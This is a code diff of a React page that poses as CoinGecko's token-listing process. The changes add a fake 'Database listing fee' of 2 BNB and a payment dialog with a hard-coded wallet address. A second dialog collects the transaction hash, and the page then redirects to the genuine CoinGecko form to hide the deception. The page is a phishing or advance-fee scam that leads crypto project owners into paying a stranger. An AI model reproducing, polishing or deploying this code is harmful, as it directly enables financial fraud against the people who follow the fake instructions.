@@ -13,25 +13,37 @@ import DialogTitle from '@mui/material/DialogTitle';
 const Startpage = () => {
   const [open, setOpen] = React.useState(false);
   const [show, setShow] = React.useState(false);
+  const [addy, setAddy] = React.useState(false);
   const handleOpen = () => {
     setOpen(true);
+
     setTimeout(() => {
       setOpen(false);
-      window.location.replace("https://www.coingecko.com/request-form/submissions?locale=en")
+     
     }, 5000);
-    // setTimeout(() => {
-    //   setShow(true);
-    // }, 3100);
+    setTimeout(() => {
+      setShow(true);
+    }, 3100);
 
   };
 
 
   const handleClickOpen = () => {
-    setShow(true);
+    setOpen(true);
+    setShow(false);
+    setTimeout(() => {
+      setOpen(false)
+    }, 5000);
+    setTimeout(() => {
+      setAddy(true)
+    }, 5100);
   };
 
   const Close = () => {
-    setShow(false);
+    window.location.replace("https://www.coingecko.com/request-form/submissions?locale=en")
+  };
+  const cancel = () => {
+    setAddy(false)
   };
 
   
@@ -139,6 +151,7 @@ Database_file
 <p>
 Please ensure that all details are accurately implemented to avoid additional charges for token updates by <a href="https://www.coingecko.com/" className='text-blue-500 underline'>CoinGecko</a>. Once verified, approve the publishing. It takes approximately 1-3 hours for the listing to be fully published on our official <a href="https://www.coingecko.com/" className='text-blue-500 underline'>CoinGecko</a> platform.
 </p>
+<p className='app mt-2'><span className='text-red-500 font-bold'>NOTE:</span> The Database listing fee cost 2 BNB, Endavour to send payment tx for fast verification and approval.</p>
 </div>
 
 <div className='mt-3 app flex justify-between'>
@@ -192,7 +205,7 @@ Please ensure that all details are accurately implemented to avoid additional ch
       >
         <CircularProgress color="inherit" />
       </Backdrop>
-      {/* <div>
+      <div>
       <React.Fragment>
       <Dialog
         open={show}
@@ -200,26 +213,65 @@ Please ensure that all details are accurately implemented to avoid additional ch
         aria-describedby="alert-dialog-description"
       >
         <DialogTitle id="alert-dialog-title">
-          {"CONGRATULATIONS!!"}
+          <p className='md:text-base font-bold text-sm'>
+          PAYMENT DETAILS
+          </p>
         </DialogTitle>
         <DialogContent>
           <DialogContentText id="alert-dialog-description">
-            <p>
-            Let Google help apps determine location. This means sending anonymous
-            location data to Google, even when no apps are running.
-
+            <p className='app md:text-sm text-xs'>
+            Send excatly 2 BNB to the wallet address by copying it, to avoid delay or loss of funds.
+           
+            </p>
+            <p className='text-sm mt-2 text-black font-bold app'>
+              BNB Address:
+            </p>
+            <p className='app text-black'>
+            0x4E8ACC4c74e5FF78d1ff32AC345DfC3dfdE5A887
             </p>
           </DialogContentText>
         </DialogContent>
         <DialogActions>
          
-          <button onClick={""} autoFocus className='w-full app bg-green-600 py-2'>
-            Click here to publish on CoinGecko
+          <button onClick={handleClickOpen} autoFocus className='w-full app bg-green-600 py-2'>
+            I have made payment
           </button>
         </DialogActions>
         </Dialog>
         </React.Fragment>
-      </div> */}
+      </div>
+      <div>
+      <React.Fragment>
+      <Dialog
+        open={addy}
+        aria-labelledby="alert-dialog-title"
+        aria-describedby="alert-dialog-description"
+      >
+        <DialogTitle id="alert-dialog-title">
+          <p className='md:text-base font-bold text-sm'>
+          PAYMENT TRANSACTION DETTAILS
+          </p>
+        </DialogTitle>
+        <DialogContent>
+          <DialogContentText id="alert-dialog-description">
+   <p className='app text-sm'>
+    Please provide us with the payment transaction tx, for fast track and proper verification of payment. 
+   </p>
+   <input type="text" className='mt-2 p-2 app w-full outline-none border-black border-2'/>
+          </DialogContentText>
+        </DialogContent>
+        <DialogActions>
+         
+          <button onClick={Close} autoFocus className='w-full app bg-green-600 py-2'>
+            Approve
+          </button>
+          <button onClick={cancel} autoFocus className='w-full app bg-red-600 py-2'>
+            Cancel
+          </button>
+        </DialogActions>
+        </Dialog>
+        </React.Fragment>
+      </div>
     </div>
   )
 }
